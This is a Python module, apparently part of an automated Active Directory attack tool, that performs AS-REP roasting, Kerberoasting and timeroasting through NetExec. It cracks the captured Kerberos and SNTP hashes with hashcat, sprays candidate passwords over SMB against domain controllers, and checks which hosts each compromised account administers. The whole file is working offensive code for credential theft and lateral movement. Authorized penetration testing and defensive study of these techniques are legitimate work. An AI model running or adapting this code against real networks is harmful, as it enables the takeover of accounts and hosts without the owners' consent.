"""Kerberos roasting, hashcat cracking, and SMB credential spraying."""
import os
import re
import tempfile

from .schema import DB, User, Hash
from .nxcwrap import nxc, Cred, login_ok, pwned
from .shell import run, have
from .console import info, good, warn, Progress

_ASREP = re.compile(r'\$krb5asrep\$(?:\d+\$)?([^@:$\s]+)')
_ASREP_HASH = re.compile(r'\$krb5asrep\$\S+')
_TGS = re.compile(r'\$krb5tgs\$\d+\$\*([^$*]+)[\*$]')
_TGS_HASH = re.compile(r'\$krb5tgs\$\S+')
_SNTP = re.compile(r'(\d+):(\$sntp-ms\$\S+)')


def _user_by_name(db: DB, name: str) -> User | None:
    name = name.lower()
    for user in db._users:
        if user.name.lower() == name:
            return user
    return None


def _write_users(db: DB) -> str:
    fd, path = tempfile.mkstemp(prefix='autowin-users-')
    with os.fdopen(fd, 'w') as f:
        for user in db._users:
            f.write(user.name + '\n')
    return path


def _collect(cmd_output_file: str) -> str:
    try:
        with open(cmd_output_file) as f:
            return f.read()
    except OSError:
        return ''


def asrep(db: DB) -> None:
    """AS-REP roast all known users (no credential required)."""
    if not db._users:
        return
    userfile = _write_users(db)
    outfile = tempfile.mkstemp(prefix='autowin-asrep-')[1]
    try:
        for domain in db._domains.values():
            if domain.dc is None:
                continue
            # keyed by user count so a grown user set re-roasts, but a resume
            # with the same users is skipped
            count = sum(1 for u in db._users if u.owner.domain is domain)
            key = f'asrep:{domain.name}:{count}'
            if db.store and db.store.is_done(key):
                continue
            console_out = nxc('ldap', domain.dc.ip, Cred(username='', secret='', domain=domain.name),
                              extra=['-u', userfile, '-p', '', '--asreproast', outfile], timeout=120)
            output = console_out + '\n' + _collect(outfile)
            for hashline in _ASREP_HASH.findall(output):
                m = _ASREP.search(hashline)
                if not m:
                    continue
                user = _user_by_name(db, m.group(1))
                if user and user.hash is None:
                    db.set_hash(user, 'asrep', hashline)
            if db.store:
                db.store.mark_done(key)
    finally:
        for p in (userfile, outfile):
            try:
                os.unlink(p)
            except OSError:
                pass


def kerberoast(db: DB, cred: Cred) -> None:
    """Kerberoast with a valid domain credential."""
    outfile = tempfile.mkstemp(prefix='autowin-kerb-')[1]
    try:
        for domain in db._domains.values():
            if domain.dc is None:
                continue
            if cred.domain and db.domain(cred.domain) is not domain:
                continue
            key = f'kerberoast:{domain.name}:{cred.key()}'
            if db.store and db.store.is_done(key):
                continue

            console_out = nxc('ldap', domain.dc.ip, cred, extra=['--kerberoasting', outfile], timeout=120)
            output = console_out + '\n' + _collect(outfile)
            for hashline in _TGS_HASH.findall(output):
                m = _TGS.search(hashline)
                if not m:
                    continue
                user = _user_by_name(db, m.group(1))
                if user and user.hash is None:
                    db.set_hash(user, 'kerberoast', hashline)
            if db.store:
                db.store.mark_done(key)
    finally:
        try:
            os.unlink(outfile)
        except OSError:
            pass


def timeroast(db: DB, wordlist: str) -> None:
    """Timeroast computer accounts (MS-SNTP) and crack them."""
    if 'timeroast' not in _timeroast_available():
        return
    for domain in db._domains.values():
        if domain.dc is None:
            continue
        output = nxc('smb', domain.dc.ip, Cred.anonymous(), module='timeroast', timeout=120)
        for rid, hashline in _SNTP.findall(output):
            if db.store:
                db.store.add_hash(domain.name, f'RID-{rid}', 'timeroast', hashline)
            cracked = _crack(Hash(source='timeroast', hash=hashline), wordlist)
            if cracked is not None:
                good(f'cracked machine account RID {rid}: {cracked}')


def _timeroast_available() -> set[str]:
    from .modules import available
    return available('smb')


def _mode(h: Hash) -> int:
    if h.source == 'timeroast':
        return 31300
    m = re.search(r'\$krb5(?:asrep|tgs)\$(\d+)\$', h.hash)
    etype = int(m.group(1)) if m else 23
    if h.source == 'asrep':
        return 18200
    return {23: 13100, 17: 19600, 18: 19700}.get(etype, 13100)


def _dehex(password: str) -> str:
    if password.startswith('$HEX[') and password.endswith(']'):
        try:
            return bytes.fromhex(password[5:-1]).decode('utf-8', 'ignore')
        except ValueError:
            pass
    return password


def _crack(h: Hash, wordlist: str) -> str | None:
    mode = str(_mode(h))
    hpath = tempfile.mkstemp(prefix='autowin-', suffix='.hash')[1]
    opath = tempfile.mkstemp(prefix='autowin-', suffix='.out')[1]
    with open(hpath, 'w') as f:
        f.write(h.hash + '\n')
    try:
        # already cracked in a previous run (potfile)?
        show = run('hashcat', '-m', mode, '--show', hpath, '--outfile', opath,
                   '--outfile-format', '2', timeout=60)
        password = _read_outfile(opath)
        if password is not None:
            return password

        run('hashcat', '-m', mode, hpath, wordlist, '-O', '-w', '3',
            '--outfile', opath, '--outfile-format', '2', timeout=900)
        return _read_outfile(opath)
    finally:
        for p in (hpath, opath):
            try:
                os.unlink(p)
            except OSError:
                pass


def _read_outfile(path: str) -> str | None:
    try:
        with open(path) as f:
            line = f.readline().strip()
    except OSError:
        return None
    return _dehex(line) if line else None


def _elide(h: str, keep: int = 48) -> str:
    """Shorten a long hash for display (NTLM prints whole; krb5 blobs elide)."""
    h = h.strip()
    return h if len(h) <= keep else f'{h[:32]}...{h[-12:]} ({len(h)} chars)'


def crack_hashes(db: DB, wordlist: str) -> None:
    if not have('hashcat'):
        warn('hashcat not found; skipping cracking')
        return
    targets = [u for u in db._users if u.hash is not None and u.password is None]
    with Progress('cracking hashes', total=len(targets)) as bar:
        for user in targets:
            cracked_hash = user.hash.hash
            source = user.hash.source
            password = _crack(user.hash, wordlist)
            if password is not None:
                good(f'cracked {source} hash {_elide(cracked_hash)} '
                     f'for {user.domain}\\{user.name}')
                db.set_password(user, password, source=f'crack:{source}')
            bar.update()


def spray_targets(dc_ip: str, domain: str, users: list[str], candidates: list[str],
                  store=None) -> list[tuple[str, str]]:
    """Explicit, operator-driven password spray (NOT part of auto-discovery).

    Tries each candidate password for each user against `dc_ip`. Stops at the
    first hit per user. Any validated credential is written to the store.
    Returns the list of (username, password) that worked.
    """
    hits: list[tuple[str, str]] = []
    for user in users:
        for candidate in candidates:
            cred = Cred(user, candidate, domain)
            if login_ok(nxc('smb', dc_ip, cred, timeout=30)):
                good(f'sprayed {domain}\\{user}:{candidate}')
                hits.append((user, candidate))
                if store:
                    store.add_credential(domain, user, candidate, is_hash=False,
                                         source='spray', host=dc_ip)
                    store.add_user(domain, user)
                break
    return hits


def check_admin(db: DB) -> None:
    """Flag which boxes each credentialed user is local admin (Pwn3d!) on."""
    users = db.credentialed_users()
    total = sum(len(db.boxes_in(u.domain)) for u in users)
    with Progress('admin check (Pwn3d!)', total=total) as bar:
        for user in users:
            try:
                cred = Cred.from_user(user)
            except ValueError:
                bar.update(len(db.boxes_in(user.domain)))
                continue
            for box in db.boxes_in(user.domain):
                if box.hostname not in user.admin_on:
                    key = f'admin:{box.hostname}:{cred.key()}'
                    if not (db.store and db.store.is_done(key)):
                        if pwned(nxc('smb', box.ip, cred, timeout=30)):
                            user.admin_on.add(box.hostname)
                            good(f'{user.domain}\\{user.name} is admin on {box.hostname}')
                        if db.store:
                            db.store.mark_done(key)
                bar.update()
